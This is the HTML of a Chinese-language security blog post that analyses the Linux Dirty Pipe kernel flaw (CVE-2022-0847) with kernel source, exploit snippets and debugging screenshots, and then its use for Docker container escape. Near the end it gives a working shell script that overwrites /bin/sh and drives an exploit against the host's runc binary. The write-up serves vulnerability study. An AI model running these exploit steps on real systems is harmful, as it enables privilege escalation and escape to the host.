        <span class="n">kill_fasync</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">fasync_readers</span><span class="p">,</span> <span class="n">SIGIO</span><span class="p">,</span> <span class="n">POLL_IN</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">wake_next_writer</span><span class="p">)</span>
        <span class="n">wake_up_interruptible_sync_poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">wr_wait</span><span class="p">,</span> <span class="n">EPOLLOUT</span> <span class="o">|</span> <span class="n">EPOLLWRNORM</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">sb_start_write_trylock</span><span class="p">(</span><span class="n">file_inode</span><span class="p">(</span><span class="n">filp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">i_sb</span><span class="p">))</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="n">file_update_time</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">err</span><span class="p">;</span>
        <span class="n">sb_end_write</span><span class="p">(</span><span class="n">file_inode</span><span class="p">(</span><span class="n">filp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">i_sb</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>在EXP中的<code>prepare_pipe()</code>函数中，首先将管道填满，并且每次写入的数据大小为<code>4k</code></p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">r</span> <span class="o">=</span> <span class="n">pipe_size</span><span class="p">;</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;)</span> <span class="p">{</span>
        <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">?</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">:</span> <span class="n">r</span><span class="p">;</span>
        <span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
        <span class="n">r</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
    <span class="p">}</span>
</pre></div>
<p>导致<code>chars = total_len &amp; (PAGE_SIZE-1);</code>每次都为零, 所以不会进入第一个if中</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">chars</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">was_empty</span><span class="p">)</span> <span class="p">{</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153850-5104b768-97cc-1.png"/></p>
<p>由于不断的写，导致需要申请新的页, 并且新的页的flag为<code>PIPE_BUF_FLAG_CAN_MERGE</code>, 并直接被放入了页数组中</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153901-5798d532-97cc-1.png"/></p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">)</span> <span class="p">{</span>                                                                        
            <span class="c1">// 如果缓存页为空，则新分配的page</span>
            <span class="p">...</span>         
            <span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
            <span class="c1">// 把新申请的页放入页数组中</span>
            <span class="p">...</span>
                <span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="n">PIPE_BUF_FLAG_CAN_MERGE</span><span class="p">;</span>
                <span class="c1">// 设置flag, 默认为PIPE_BUF_FLAG_CAN_MERGE， 即可融合的页</span>
                <span class="c1">// #define PIPE_BUF_FLAG_CAN_MERGE  0x10</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153914-5f51c86a-97cc-1.png"/></p>
<p>重复15次，把所有的<code>pipe buffer</code>的f<code>lags</code>都置为0x10</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153929-682fed90-97cc-1.png"/></p>
<h5 data-content="1" id="b0493eb4646a2ababc1f553b507690b0">用splice将file page和pipe 关联起来</h5>
<p>首先在<code>copy_page_to_iter_pipe</code>中停下，保存<code>page</code>的地址</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153938-6d4e4f2e-97cc-1.png"/></p>
<p>继续到<code>pipe_write</code>停下, 由于这次不是<code>4k</code>的整数倍，于是<code>chars</code>不为0，进入到漏洞分支</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153944-7158a114-97cc-1.png"/></p>
<p>打印出即将写入的<code>page</code>, 和我们保存的<code>page</code>一样，已经即将把数据写入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153950-74a5e5f2-97cc-1.png"/></p>
<h4 data-content="1" id="412fe39f8be99db7485e5331b618a0a6">漏洞效果</h4>
<p>由于虚拟机只有最基本的环境，所以<code>su</code>, <code>id</code>这类命令都需要上文下载的静态编译的<code>busybox实现</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119153956-785ae68e-97cc-1.png"/></p>
<p>可以看到，低权限用户也可以对高权限文件改写</p>
<h3 data-content="1" id="da4c6d64c4472e4e1ac826db32a852b7">利用条件与限制</h3>
<h4 data-content="1" id="4c2df052d598fcf5e16a2d70e399f6fa">利用条件</h4>
<ul>
<li>有可读权限或者可以传回文件的文件描述符</li>
<li>有漏洞的内核</li>
</ul>
<h4 data-content="1" id="7b575b5a40ccf47bff380cfd65fa16a3">利用的限制</h4>
<ul>
<li>第一个字节不可修改，并且单次写入不能大于4k</li>
<li>只能单纯覆盖，不能调整文件大小</li>
<li>由于漏洞基于内存页，所以不会对磁盘有影响</li>
</ul>
<h3 data-content="1" id="8a7856bc38f793c98675b437b3cefcb6">与docker的关系</h3>
<p>由于docker和宿主机是共享内核，尽管其他进程资源是隔离开的，内核洞也很可能会docker容器造成安全问题.</p>
<h4 data-content="1" id="f99c4d62a4cdebaa701a6cf6347a4aea">对于容器的影响</h4>
<p>由于docker本质上是由一组互相重叠的层组层的，容器引擎将其合并到一起，原本这些层都是只读的，但由于脏管道漏洞的影响，我们可以在<code>u1</code>容器修改<code>/etc/passwd</code>使得<code>u2</code>容器的<code>/etc/passwd</code>被修改</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119154010-809564a0-97cc-1.png"/></p>
<h4 data-content="1" id="a3c1b55badb4d99cae1e4517d0f4dd10">利用CAP_DAC_READ_SEARCH实现容器逃逸</h4>
<p>通过利用<code>CAP_DAC_READ_SEARCH</code>与脏管道可以实现覆盖主机文件, 该攻击手段可以在<a href="https://github.com/greenhandatsjtu/CVE-2022-0847-Container-Escape" target="_blank">github看到详细过程</a></p>
<p>实际上主要是<code>CAP_DAC_READ_SEARCH</code>可以调用<code>open_by_handle_at</code>, 可以获得主机文件的文件描述符，配合脏管道于是就可以修改主机文件</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119154017-84adf462-97cc-1.png"/></p>
<p>这种攻击方式非常简单，核心就是获得文件的文件描述符即可</p>
<h4 data-content="1" id="e006177885fe6169b6ad9b7aae4df702">通过runc实现容器逃逸</h4>
<p>一个容器开启时，可以分为以下三步</p>
<ul>
<li>fork创建子进程</li>
<li>初始化容器化环境</li>
<li>将执行流重定向到用户提供的入口点</li>
</ul>
<p>对于第三步，以大名鼎鼎的<code>CVE-2019-5736</code>为例，当重定向入口点时，容器内的<code>/proc/self/exec</code>与主机的<code>runc</code>二进制文件相关联</p>
<p>因此可以通过在容器内写入该文件描述符实现容器逃逸</p>
<p>对于<code>CVE-2019-5736</code>的<a href="https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b" target="_blank">修复</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119154024-88f617e8-97cc-1.png"/></p>
<p>由于篇幅原因这里不跟进<code>CVE-2019-5736</code>的修复的具体代码，直接看<code>git commit</code>了解修复逻辑</p>
<p>可以看到修复逻辑是克隆<code>/proc/self/exec</code>避免容器内部直接获取<code>runC</code></p>
<p>然而很快开发者修改了<a href="https://github.com/opencontainers/runc/commit/16612d74de5f84977e50a9c8ead7f0e9e13b8628" target="_blank">修复逻辑</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119154030-8c7f5f8c-97cc-1.png"/></p>
<p>可以看到开发者认为克隆导致的内存开销太大了，可能造成<code>OOM</code>或者其他问题，把修复逻辑改成了只读挂载</p>
<p>这里联想到上文总结的<code>脏管道</code>的利用条件和利用效果，发现刚好契合</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230119154036-9027ad56-97cc-1.png"/></p>
<p>这里的利用主要参考了<a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/" target="_blank">链接</a></p>
<p>主机执行<code>docker exec -it u1 /bin/sh</code>后<code>/usr/sbin/runc</code>的哈希值变化了，且头部被注入标识</p>
<p>利用思路也很简单，修改<code>CVE-2022-0847</code>的exp，将需要注入的字节改为shellcode，这里我随便改的标识</p>
<p>然后在容器内找到主机的<code>runc</code>的pid即可，可以参考以下的<code>shell</code>脚本</p>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>

<span class="nb">echo</span> <span class="s1">'#!/proc/self/exe'</span> &gt; /bin/sh

<span class="nb">echo</span> <span class="s2">"Waiting for runC to be executed in the container"</span>

<span class="k">while</span> <span class="nb">true</span> <span class="p">;</span> <span class="k">do</span>
<span class="nv">runC_pid</span><span class="o">=</span><span class="s2">""</span>

<span class="k">while</span> <span class="o">[</span> -z <span class="s2">"</span><span class="nv">$runC_pid</span><span class="s2">"</span> <span class="o">]</span> <span class="p">;</span> <span class="k">do</span>
        <span class="nv">runC_pid</span><span class="o">=</span><span class="k">$(</span>ps axf <span class="p">|</span> grep /proc/self/exe <span class="p">|</span> grep -v grep <span class="p">|</span> awk <span class="s1">'{print $1}'</span><span class="k">)</span>
        <span class="k">done</span>

        /exp /proc/<span class="si">${</span><span class="nv">runC_pid</span><span class="si">}</span>/exe
<span class="k">done</span>
</pre></div>
<h3 data-content="1" id="eb1857f5d88be7eef5eed25a6baf69b6">总结</h3>
<p>由于docker容器和主机是共享内核的，且目前的<code>runc</code>是通过挂为只读权限防止逃逸的，对于提权类内核洞来说，这两个限制很容易被绕过，所以尽管容器逃逸类漏洞很少见，但提权类的内核漏洞很可能导致容器逃逸。</p>
</div>
</div>